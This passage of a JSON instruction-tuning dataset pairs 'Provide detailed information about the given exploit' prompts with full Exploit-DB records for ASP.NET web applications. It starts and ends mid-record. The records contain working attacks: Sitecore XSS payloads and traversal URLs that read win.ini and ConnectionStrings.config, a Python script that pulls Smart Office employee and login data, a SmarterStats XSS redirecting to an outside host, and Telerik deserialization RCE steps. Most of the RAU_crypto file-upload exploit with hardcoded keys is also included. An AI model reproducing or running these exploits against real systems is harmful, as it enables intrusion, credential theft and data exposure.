Concept\n----------------\nFile Extension parameter is not properly escaped. This could lead to an XSS attack that could possibly affect administrators,users,editor.\n\n1. Login to application and navigate to \"https://example.com/sitecore/shell/Applications/Content Editor.aspx?sw_bw=1\"\n2. Go to media library and click on any image and edit it\n3. Now in Extension input parameter inject any XSS vector like '\"><svg=onload=prompt(2)>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 41618",
        "output": {
            "ID": "41618",
            "File": "exploits/aspx/webapps/41618.txt",
            "Description": "Sitecore CMS 8.1 Update-3 - Cross-Site Scripting",
            "Date Published": "2017-03-15",
            "Author": "Pralhad Chaskar",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-03-15",
            "Date Updated": "2017-03-15",
            "Verified": "0",
            "Codes": [
                "CVE-2016-8855"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Stored Cross Site Scripting (XSS) in Sitecore Experience Platform 8.1 Update-3\n# Date: March 15, 2017\n# Exploit Author: Pralhad Chaskar\n# Vendor Homepage: http://www.sitecore.net/en\n# Version: 8.1 rev. 160519\n# Tested on: Sitecore Experience Platform 8.1 Update-3 i.e.; 8.1 rev. 160519\n# CVE : CVE-2016-8855\n\nVendor Description\n------------------\nSitecore CMS makes it effortless to create content and experience rich websites that help you achieve your business goals such as increasing sales and search engine visibility, while being straight-forward to integrate and administer. Sitecore lets you deliver sites that are highly scalable, robust and secure. Whether you're focused on marketing, development and design, or providing site content, Sitecore delivers for you.\n\nDescription\n------------\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.\n\nVulnerability Class\n--------------------\nCross-site Scripting (XSS) - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\n\nProof of Concept\n----------------\nName and Description input fields aren't properly escaped. This could lead to an XSS attack that could possibly affect administrators,users,editor.\n\n1. Login to application and navigate to \"https://abc.com/sitecore/client/Applications/List Manager/Taskpages/Contact list\"\n2. Create new Contact List, add the XSS vector in Name and Description parameter using proxy (Burp) and Save the Contact List\n3. Navigate Dashboard of List Manager on \"https://abc.com/sitecore/shell/sitecore/client/Applications/List Manager/Dashboard\" leading to execution of XSS payload.\n\nVendor Contact Timeline\n------------------------\nDiscovered: October 16, 2016\nVendor Notification: October 18, 2016\nAdvisory Publication: Mar 15, 2017\nPublic Disclosure: Mar 15, 2017\n\nAffected Targets\n----------------\nSitecore Experience Platform 8.1 Update-3 i.e.; 8.1 rev. 160519\n\nSolution\n--------\nUpgrade to Sitecore Experience Platform 8.2 Update-2 to fix this issue.\n\nCredits\n-------\nPralhad Chaskar\nInformation Security Analyst\nHelp AG Middle East\n\nReferences\n----------\n[1] Help AG Middle East http://www.helpag.com/\n[2] Sitecore Experience Platform https://dev.sitecore.net/Downloads/Sitecore_Experience_Platform.aspx"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45973",
        "output": {
            "ID": "45973",
            "File": "exploits/aspx/webapps/45973.txt",
            "Description": "Sitecore CMS 8.2 - Cross-Site Scripting / Arbitrary File Disclosure",
            "Date Published": "2017-05-05",
            "Author": "Usman Saeed",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-12-11",
            "Date Updated": "2018-12-11",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Exploit title: Sitecore CMS v8.2  multiple vulnerabilities\nProduct: Sitecore\nVersion: 8.2, Rev: 161221, Date: 21st December, 2016\nDate: 05-05-2017\nAuthor: Usman Saeed\nEmail: usman@xc0re.net <%20usman@xc0re.net>\nVendor Homepage: http://www.sitecore.net/\n\n\nDisclaimer: Everything mentioned below is for educational puposes. The\nvulnerability details are mentioned as is. I would not be held responsible\nfor any misuse of this information.\n\nSummary:\nMultiple vulnerabilities were found in the Sitecore product.  The\nvulnerabilities include two instances of arbitrary file access and once\ninstance of reflected cosssite scripting.\n\n1: Arbitrary file access:\n\n- Description:\n\nThe vulnerability lies in the tools which can be accessed via the\nadministrator user. The vulnerability exists because there is no bound\ncheck for absolute path in the application, that is, if the absolute path\nis provided to the vulnerable URL, it reads the path and shows the contents\nof the file requested.\n\n- Exploit:\n1. Once authenticated as the administrator perform a GET request to the\nfollowiung URL:\n/sitecore/shell/Applications/Layouts/IDE.aspx?fi=c:\\windows\\win.ini\n\n2. Once authenticated as the administrator perform a POST request to the\nfollowiung URL:\n\nPOST /sitecore/admin/LinqScratchPad.aspx\nHTTP/1.1\nHost: <HOST>\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101\n Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1463\nReferer: <OMITTED>\nCookie: <OMITTED>\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n__VIEWSTATE= &__VIEWSTATEGENERATOR=\n&__EVENTVALIDATION=&LinqQuery=%0D%0A&Reference=c%3A%5Cwindows%\n5Cwin.ini&Fetch=\n\n\n\n2. Reflected Cross-site Scripting:\n- Description:\nThe application does not sanatize the USER input which allows a normal\nauthenticated user to exploit this vulnerability.\n\n\n- Exploit:\n\nPOST /sitecore/shell/Applications/Tools/Run HTTP/1.1\nHost: <HOST>\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101\n Firefox/53.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nReferer:  <OMITTED>\nContent-Length: 518\nCookie:  <OMITTED>\n\n&__PARAMETERS=run%3Aok&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=1763&__Y=883&__URL=https%3A///sitecore/shell/Applications/Tools/Run&__CSRFTOKEN=\n&__VIEWSTATE=&__VIEWSTATE=&Program=%3F%3E%3C%3F%3E%3Ciframe%20src%3D%22Javascript%3Aalert(\ndocument.cookie)%3B%22%3E%3C%2Fiframe%3E"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45152",
        "output": {
            "ID": "45152",
            "File": "exploits/aspx/webapps/45152.txt",
            "Description": "Sitecore.Net 8.1 - Directory Traversal",
            "Date Published": "2018-08-06",
            "Author": "Chris",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-08-06",
            "Date Updated": "2018-08-09",
            "Verified": "0",
            "Codes": [
                "CVE-2018-7669"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Sitecore.Net 8.1 - Directory Traversal\n# Date: 2018-04-23\n# CVE: CVE-2018-7669\n# Researcher: Chris Moberly at The Missing Link Security\n# Vendor: Sitecore\n# Version: CMS - 8.1 and up (earlier versions untested)\n# Authentication required: Yes\n\n# An issue was discovered in Sitecore CMS that affects at least\n# 'Sitecore.NET 8.1' rev. 151207 Hotfix 141178-1 and above. The 'Log Viewer'\n# application is vulnerable to a directory traversal attack, allowing an attacker\n# to access arbitrary files from the host Operating System using a\n# 'sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=' URI. Validation\n# is performed to ensure that the text passed to the 'file' parameter correlates\n# to the correct log file directory. This filter can be bypassed by including a\n# valid log filename and then appending a traditional 'dot dot' style attack.\n\n# [Steps to Reproduce]\n# The 'Log Viewer' application renders log files from the local filesystem inside\n# the web browser using a URL like the following:\nhttp://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=\n\n# The following URL can be used to validate the vulnerability by accessing the\n# win.ini file on a Windows host (remove line breaks):\nhttp://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=c%3a%5cwebsites%5c<website>%5cdata%5clogs%5<valid log file>.txt\\..\\..\\..\\..\\..\\windows\\win.ini\n\n# The following URL can be used to access the application's configuration file\n# containing SQL login credentials (remove line breaks):\nhttp://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=c%3a%5cwebsites%5c<website>%5cdata%5clogs%5c<valid log file>.txt\\..\\..\\..\\Website\\App_Config\\ConnectionStrings.config\n\n# Both of the above URLs are dependent on the application's configuration and\n# must be modified to correct the <website> and <valid log file> portion."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51539",
        "output": {
            "ID": "51539",
            "File": "exploits/aspx/webapps/51539.py",
            "Description": "Smart Office Web 20.28 - Remote Information Disclosure (Unauthenticated)",
            "Date Published": "2023-06-22",
            "Author": "Tejas Pingulkar",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2023-06-22",
            "Date Updated": "2023-06-22",
            "Verified": "0",
            "Codes": [
                "CVE-2022-47076;CVE-2022-47075"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Smart Office Web 20.28 - Remote Information Disclosure (Unauthenticated)\n# Shodan Dork:: inurl:\"https://www.shodan.io/search?query=smart+office\"\n# Date: 09/Dec/2022\n# Exploit Author: Tejas Nitin Pingulkar (https://cvewalkthrough.com/)\n# Vendor Homepage: https://smartofficepayroll.com/\n# Software Link: https://smartofficepayroll.com/downloads\n# Version: Smart Office Web 20.28 and before\n# CVE Number : CVE-2022-47075 and CVE-2022-47076\n# CVSS : 7.5 (High)\n# Reference : https://cvewalkthrough.com/smart-office-suite-cve-2022-47076-cve-2022-47075/\n# Vulnerability Description:\n# Smart Office Web 20.28  and before allows Remote Information Disclosure(Unauthenticated) via insecure direct object reference (IDOR). This was fixed in latter version except for ExportEmployeeDetails.\n\nimport wget\nimport os\nfrom colorama import Fore, Style\n\ndef download_file(url, filename):\n    wget.download(url, filename)\n\n# Disclaimer\nprint(Fore.YELLOW + \"Disclaimer: This script is for educational purposes only.\")\nprint(\"The author takes no responsibility for any unauthorized usage.\")\nprint(\"Please use this script responsibly and adhere to the legal and ethical guidelines.\")\n\nagree = input(\"Do you agree to the disclaimer? (1 = Yes, 0 = No): \")\nif agree != \"1\":\n    print(\"You have chosen not to agree. Exiting the script.\")\n    exit()\n\n# Print name in red\nname = \"Exploit by Tejas Nitin Pingulkar\"\nprint(Fore.RED + name)\nprint(Style.RESET_ALL)  # Reset color\n\nwebsite = input(\"Enter URL [https://1.1.1.1:1111 or http://1.1.1.1]: \")\ntarget_version = input(\"Is the target software version 20.28 or later? (1 = Yes, 0 = No): \")\nfolder_name = input(\"Enter the folder name to save the files: \")\n\n# Create the folder if it doesn't exist\nif not os.path.exists(folder_name):\n    os.makedirs(folder_name)\n\nurls_filenames = []\n\nif target_version == \"1\":\n    urls_filenames.append((website + \"/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeOtherDetails\", \"ExportEmployeeOtherDetails.csv\"))\nelse:\n    urls_filenames.extend([\n        (website + \"/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeDetails\", \"ExportEmployeeDetails.csv\"),\n        (website + \"/DisplayParallelLogData.aspx\", \"DisplayParallelLogData.txt\"),\n        (website + \"/ExportReportingManager.aspx\", \"ExportReportingManager.csv\"),\n        (website + \"/ExportEmployeeLoginDetails.aspx\", \"ExportEmployeeLoginDetails.csv\")\n    ])\n\nprint(\"CVE-2022-47076: Obtain user ID and password from downloaded source\")\n\nfor url, filename in urls_filenames:\n    download_file(url, os.path.join(folder_name, filename))\n\n# Print \"for more such interesting exploits, visit cvewalkthrough.com\" in red\nprint(Fore.RED + \"\\nFor more such interesting exploits, visit cvewalkthrough.com\")\nprint(Style.RESET_ALL)  # Reset color"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42923",
        "output": {
            "ID": "42923",
            "File": "exploits/aspx/webapps/42923.txt",
            "Description": "SmarterStats 11.3.6347 - Cross-Site Scripting",
            "Date Published": "2017-09-27",
            "Author": "sqlhacker",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-10-01",
            "Date Updated": "2017-10-01",
            "Verified": "0",
            "Codes": [
                "CVE-2017-14620"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "\ufeff----------------------------\nTitle: CVE-2017-14620\n----------------------------\nTL;DR: SmarterStats Version 11.3.6347, and possibly prior versions,\nwill Render the Referer Field of HTTP Logfiles in URL /Data/Reports/ReferringURLsWithQueries\n----------------------------\nAuthor: David Hoyt\nDate: September 29, 2017\n----------------------------\nCVSS:3.0 Metrics\nCVSS:3.0 Vector String: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C/CR:M/MAV:N/MAC:L/MPR:N/MUI:R/MS:U/MC:L/MI:N/MA:N\nCVSS:3.0 Scores: Base Score 4.3, Temporal Score: 4.1, Environmental Score: 4.1\n----------------------------\nKeywords\n----------------------------\nCVE-2017-14620, CWE-533, CWE-532, CWE-117, CWE-93, CAPEC-86, CAPEC-79, Stored Document Object Model Cross Site Scripting (Stored DOM XSS),\nClient Side Request Forgery (CSRF), Open Redirection, HTTP Logfiles, Exploit, PoC, HTML Tags, SmarterStats 11.3\n----------------------------\nCVE-2017-14620 Requirements\n----------------------------\n\tSmarterStats Version 11.3\n\tHTTP Proxy (BurpSuite, Fiddler)\n\tWeb Browser (Chrome - Current/Stable)\n\tUser Interaction Required - Must Click Referer Link Report\n\tSupported Windows OS\n\tMicrosoft .NET 4.5\n----------------------------\nCVE-2017-14620 Reproduction\n----------------------------\nVendor Link https://www.smartertools.com/smarterstats/website-analytics\nDownload Link https://www.smartertools.com/smarterstats/downloads\n\nStep 1: Test with an HTTP Logfile containing a URL-encoded String to the Referer Field with HTML Tags to be Rendered in a Browser:\n\nhttp://www.bing.com/search?q=<html><head><meta http-equiv=\\\"refresh\\\" content=\\\"5;\nurl=http://xss.cx/\\\"><title>Loading</title></head>\\n<body><form method=\\\"post\\\"\naction=\\\"http://xss.cx/\\\" target=\\\"_top\\\" id=\\\"rf\\\"><input type=\\\"hidden\\\"\nname=\\\"ic\\\" value=\\\"0\\\"><input type=\\\"hidden\\\" name=\\\"fb\\\" value=\\\"true\\\"/>\n</form>\\n<script>!function(e,t){var n,i;return!e.navigator&form=nnn\n\nStep 2: Verify the Injected IIS Logfile\nStep 3: Process the Logfiles, Select the Referer URL Report.\nIn an HTTP Proxy, watch the URL  http://localhost:9999/Data/Reports/ReferringURLsWithQueries\nwhen Browsing http://localhost:9999/Default.aspx in Chrome (current/stable).\n\nStep 4: Verify the Result in your HTTP Proxy returned from the Server:\n\n{\"c\":[{\"v\":\"http://www.bing.com/search?q=<html><head><meta http-equiv=\\\"refresh\\\"\ncontent=\\\"5; url=http://xss.cx/\\\"><title>Loading</title></head>\\n<body>\n<form method=\\\"post\\\" action=\\\"http://xss.cx/\\\" target=\\\"_top\\\" id=\\\"rf\\\">\n<input type=\\\"hidden\\\" name=\\\"ic\\\" value=\\\"0\\\"><input type=\\\"hidden\\\" name=\\\"fb\\\" value=\\\"true\\\"/>\n</form>\\n<script>!function(e,t){var n,i;return!e.navigator&form=nnn\"},{\"v\":\"2\",\"f\":\"2\"}]}\n\nIn your Browser, the HTTP Response will cause a GET to xss.cx after 5 seconds. Verify in HTTP Proxy.\n...\nGET / HTTP/1.1\nHost: xss.cx\n...\n\nStep 5: Watch your Browser get Redirected to XSS.Cx.\n----------------------------\nSummary: The Referer Field in IIS Logfiles, and possibly other Field Names, are Rendered by SmarterStats Version 11.3.6347.\n----------------------------\nTimeline\n----------------------------\nReported to SmarterTools on September 19, 2017\nObtain CVE-2017-14620 from MITRE on September 20, 2017\nResolved September 28, 2017 with Version 11.xxxx"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50328",
        "output": {
            "ID": "50328",
            "File": "exploits/aspx/webapps/50328.txt",
            "Description": "SmarterTools SmarterTrack 7922 - 'Multiple' Information Disclosure",
            "Date Published": "2021-09-24",
            "Author": "Andrei Manole",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-09-24",
            "Date Updated": "2021-09-24",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: SmarterTools SmarterTrack 7922 - 'Multiple' Information Disclosure\n# Google Dork: intext:\"Powered by SmarterTrack\"\n# Date: 23/01/2020\n# Exploit Author: Andrei Manole\n# Vendor Homepage: https://www.smartertools.com/\n# Software Link: https://www.smartertools.com/smartertrack\n# Version: TESTED ON  10.x -> 14.x and to Build 7922 (set 9, 2021)\n# Tested on: Windows 10\n\nPOC:\nVULNERABLE TARGET/Management/Chat/frmChatSearch.aspx\nThis file disclosure all agents id and first name and second name"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47793",
        "output": {
            "ID": "47793",
            "File": "exploits/aspx/webapps/47793.txt",
            "Description": "Telerik UI - Remote Code Execution via Insecure Deserialization",
            "Date Published": "2019-12-18",
            "Author": "Bishop Fox",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-12-18",
            "Date Updated": "2019-12-18",
            "Verified": "0",
            "Codes": [
                "CVE-2019-18935"
            ],
            "Tags": [
                "Deserialization"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui",
            "Exploit": "See the full write-up at Bishop Fox, CVE-2019-18935: https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui, for a complete walkthrough of vulnerability and exploit details for this issue (along with patching instructions).\n\nInstall\ngit clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935\npython3 -m venv env\nsource env/bin/activate\npip3 install -r requirements.txt\n\nRequirements\nThis exploit leverages encryption logic from RAU_crypto. The RAUCipher class within RAU_crypto.py depends on PyCryptodome, a drop-in replacement for the dead PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.\n\nUsage\nCompile mixed mode assembly DLL payload\nIn a Windows environment with Visual Studio installed, use build_dll.bat to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization.\n\nbuild_dll.bat sleep.c\nUpload and load payload into application via insecure deserialization\nPass the DLL generated above to CVE-2019-18935.py, which will upload the DLL to a directory on the target server (provided that the web server has write permissions) and then load that DLL into the application via the insecure deserialization exploit.\n\npython3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\\Windows\\Temp' -p sleep_2019121205271355_x86.dll\n[*] Local payload name:  sleep_2019121205271355_x86.dll\n[*] Destination folder:  C:\\Windows\\Temp\n[*] Remote payload name: 1576142987.918625.dll\n\n{'fileInfo': {'ContentLength': 75264,\n              'ContentType': 'application/octet-stream',\n              'DateJson': '1970-01-01T00:00:00.000Z',\n              'FileName': '1576142987.918625.dll',\n              'Index': 0},\n 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '\n                                     'Telerik.Web.UI, Version=<VERSION>, '\n                                     'Culture=neutral, '\n                                     'PublicKeyToken=<TOKEN>',\n              'TempFileName': '1576142987.918625.dll'}}\n\n[*] Triggering deserialization...\n\n<title>Runtime Error</title>\n<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>\n<h2> <i>Runtime Error</i> </h2></span>\n...omitted for brevity...\n\n[*] Response time: 13.01 seconds\nIn the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked Sleep(10000).\n\nThanks\n@mwulftange initially discovered this vulnerability. @bao7uo wrote all of the logic for breaking RadAsyncUpload encryption, which enabled manipulating the file upload configuration object in rauPostData and subsequently exploiting insecure deserialization of that object.\n\nProof of Concept:\nhttps://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47793.zip"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43874",
        "output": {
            "ID": "43874",
            "File": "exploits/aspx/webapps/43874.py",
            "Description": "Telerik UI for ASP.NET AJAX 2012.3.1308 < 2017.1.118 - Arbitrary File Upload",
            "Date Published": "2018-01-24",
            "Author": "Paul Taylor",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-01-24",
            "Date Updated": "2018-01-26",
            "Verified": "0",
            "Codes": [
                "CVE-2017-11357;CVE-2017-11317"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Telerik UI for ASP.NET AJAX RadAsyncUpload uploader\n# Filename: RAU_crypto.py\n# Github: https://github.com/bao7uo/RAU_crypto\n# Date: 2018-01-23\n\n# Exploit Author: Paul Taylor / Foregenix Ltd\n# Website: http://www.foregenix.com/blog\n\n# Version: Telerik UI for ASP.NET AJAX\n# CVE: CVE-2017-11317, CVE-2017-11357\n# Vendor Advisory: https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload\n# Vendor Advisory: https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/insecure-direct-object-reference\n\n# Tested on: Working on versions 2012.3.1308 thru 2017.1.118 (.NET 35, 40, 45)\n\n#!/usr/bin/python3\n\n# Author: Paul Taylor / Foregenix Ltd\n# https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py\n\n# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357\n\n# Telerik Web UI for ASP.NET AJAX\n# RadAsyncUpload hardcoded keys / insecure direct object reference\n# Arbitrary file upload\n\n# Telerik fixed in June 2017 by removing default keys in\n# versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the\n# RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)\n\n# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload\n# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/insecure-direct-object-reference\n# http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security\n\n# http://target/Telerik.Web.UI.WebResource.axd?type=rau\n\nimport sys\nimport base64\nimport json\nimport re\nimport requests\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import HMAC\nfrom Crypto.Hash import SHA256\n\nimport binascii\n\n# Warning, the below prevents certificate warnings,\n# and verify = False in the later code prevents them being verified\n\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\n\nclass RAUCipher:\n    key = binascii.unhexlify(\"EB8AF90FDE30FECBE330E807CF0B4252\" +\n                             \"A44E9F06A2EA4AF10B046F598DD3EA0C\")\n    iv = binascii.unhexlify(\"E330E807CF0B425255A3A561A707D269\")\n\n    def encrypt(plaintext):\n        sys.stderr.write(\"Encrypting... \")\n        encoded = \"\"\n        for i in plaintext:\n            encoded = encoded + i + \"\\x00\"\n        plaintext = encoded + (\n                                chr(16 - (len(encoded) % 16)) *\n                                (16 - (len(encoded) % 16))\n                            )\n        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)\n        sys.stderr.write(\"done\\n\")\n        return base64.b64encode(cipher.encrypt(plaintext)).decode()\n\n    def decrypt(ciphertext):\n        sys.stderr.write(\"Decrypting... \")\n        ciphertext = base64.b64decode(ciphertext)\n        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)\n        unpad = lambda s: s[0:-ord(chr(s[-1]))]\n        sys.stderr.write(\"done\\n\")\n        return unpad(cipher.decrypt(ciphertext[0:])).decode()[0::2]\n\n    def addHmac(string, Version):\n\n        isHmacVersion = False\n\n        # \"Encrypt-then-MAC\" feature introduced in R1 2017\n        # Required for \"2017.1.118\", \"2017.1.228\", \"2017.2.503\"\n\n        if \"2017\" in Version:\n            isHmacVersion = True\n\n        hmac = HMAC.new(\n            b'PrivateKeyForHashOfUploadConfiguration',\n            bytes(string.encode()),\n            SHA256.new()\n            )\n        hmac = base64.b64encode(hmac.digest()).decode()\n        return string + hmac if isHmacVersion else string\n\n\ndef rauPostData_prep(quiet, TempTargetFolder, Version):\n    TargetFolder = RAUCipher.addHmac(\n                                \"jgas0meSrU/uP/TPzrhDTw==\",\n                                Version\n                                )\n    TempTargetFolder = RAUCipher.addHmac(\n                                RAUCipher.encrypt(TempTargetFolder),\n                                Version\n                                )\n\n    rauJSONplaintext = \\\n        '{\"TargetFolder\":\"' + TargetFolder + '\",\"TempTargetFolder\":\"' + \\\n        TempTargetFolder + \\\n        '\",\"MaxFileSize\":0,\"TimeToLive\":{\"Ticks\":1440000000000,\"Days\":0,\"Hours\":40,\"Minutes\":0,\"Seconds\":0,\"Milliseconds\":0,\"TotalDays\":1.6666666666666666,\"TotalHours\":40,\"TotalMinutes\":2400,\"TotalSeconds\":144000,\"TotalMilliseconds\":144000000},\"UseApplicationPoolImpersonation\":false}'\n    if not quiet:\n        print(\"JSON: \" + rauJSONplaintext + \"\\n\")\n    rauPostData = RAUCipher.encrypt(rauJSONplaintext) + \"&\"\n    rauVersionplaintext = \\\n        \"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=\" + \\\n        Version + \\\n        \", Culture=neutral, PublicKeyToken=121fae78165ba3d4\"\n    if not quiet:\n        print(\"Version: \" + rauVersionplaintext + \"\\n\")\n    rauPostData += RAUCipher.encrypt(rauVersionplaintext)\n    return rauPostData\n\n\ndef getVersion(url):\n    sys.stderr.write(\"Contacting server... \")\n    response = requests.get(url, verify=False)\n    html = response.text\n    sys.stderr.write(\"done\\n\")\n    match = re.search(\n        '((?<=\\<\\!-- )20\\d{2}(.\\d+)+(?= --\\>))|' +\n        '(?<=Version%3d)20\\d{2}(.\\d+)+(?=%2c)|' +\n        '(?<=Version=)20\\d{2}(.\\d+)+(?=,)',\n        html\n        )\n\n    if match:\n        return match.group(0)\n    else:\n        return \"No version result\"\n\n\ndef payload(TempTargetFolder, Version, payload_filename):\n    sys.stderr.write(\"file: \" + payload_filename + \"\\n\")\n    sys.stderr.write(\"version: \" + Version + \"\\n\")\n    sys.stderr.write(\"destination \" + TempTargetFolder + \"\\n\")\n    sys.stderr.write(\"Preparing payload... \\n\")\n    payload_file = open(payload_filename, \"r\")\n    payload_file_data = payload_file.read()\n    payload_file.close()\n    quiet = True\n\n    data = \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"rauPostData\\\"\\r\\n\"\n    data += \"\\r\\n\"\n    data += rauPostData_prep(quiet, TempTargetFolder, Version) + \"\\r\\n\"\n    data += \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"blob\\\"\\r\\n\"\n    data += \"Content-Type: application/octet-stream\\r\\n\"\n    data += \"\\r\\n\"\n    data += payload_file_data\n    data += \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"fileName\\\"\\r\\n\"\n    data += \"\\r\\n\"\n    data += \"RAU_crypto.bypass\\r\\n\"\n    data += \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"contentType\\\"\\r\\n\"\n    data += \"\\r\\n\"\n    data += \"text/html\\r\\n\"\n    data += \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"lastModifiedDate\\\"\\r\\n\"\n    data += \"\\r\\n\"\n    data += \"2017-06-28T09:11:28.586Z\\r\\n\"\n    data += \"-----------------------------68821516528156\\r\\n\"\n    data += \"Content-Disposition: form-data; name=\\\"metadata\\\"\\r\\n\"\n    data += \"\\r\\n\"\n    data += \"{\\\"TotalChunks\\\":1,\\\"ChunkIndex\\\":0,\\\"TotalFileSize\\\":1,\\\"UploadID\\\":\\\"\" + \\\n            payload_filename + \"\\\"}\\r\\n\"\n    data += \"-----------------------------68821516528156--\\r\\n\"\n    data += \"\\r\\n\"\n    sys.stderr.write(\"Payload prep done\\n\")\n    return data\n\n\ndef upload(TempTargetFolder, Version, payload_filename, url):\n    sys.stderr.write(\"Preparing to upload to \" + url + \"\\n\")\n    session = requests.Session()\n    request = requests.Request(\n                        'POST',\n                        url,\n                        data=payload(\n                                TempTargetFolder,\n                                Version,\n                                payload_filename\n                                )\n                        )\n    request = request.prepare()\n    request.headers[\"Content-Type\"] = \\\n        \"multipart/form-data; \" +\\\n        \"boundary=---------------------------68821516528156\"\n    response = session.send(request, verify=False)\n    sys.stderr.write(\"Upload done\\n\")\n    return response.text\n\n\ndef decode_rauPostData(rauPostData):\n    rauPostData = rauPostData.split(\"&\")\n    rauJSON = RAUCipher.decrypt(rauPostData[0])\n    decoded = \"\\nJSON: \" + rauJSON + \"\\n\"\n    TempTargetFolder = json.loads(rauJSON)[\"TempTargetFolder\"]\n    decoded = decoded + 